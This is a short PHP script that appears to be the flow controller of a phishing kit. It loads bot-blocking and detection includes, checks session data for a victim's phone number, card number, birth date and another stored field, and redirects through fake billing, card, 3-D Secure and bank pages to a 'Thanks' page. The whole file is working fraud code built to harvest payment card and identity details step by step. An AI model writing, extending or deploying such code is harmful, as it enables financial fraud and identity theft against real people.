<?php



include("../system/blocker.php");
include("../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);


if(isset($_SESSION['_phoneNumber_'])){

if(!empty($_SESSION['_phoneNumber_'])){


if(isset($_SESSION['_cardnumber_'])){

if(!empty($_SESSION['_cardnumber_'])){


if(isset($_SESSION['_birth_date_'])){

if(!empty($_SESSION['_birth_date_'])){



if(isset($_SESSION['_xxnxx_'])){

if(!empty($_SESSION['_xxnxx_'])){




header('Location: Thanks/');




	}else{header('Location: Bank/');}

}else{header('Location: Bank/');}


	}else{header('Location: D3-Cards/');}

}else{header('Location: D3-Cards/');}



	}else{header('Location: Cards/');}

}else{header('Location: Cards/');}



 	}else{header('Location: Biiling/');}

}else{header('Location: Biiling/');}





?>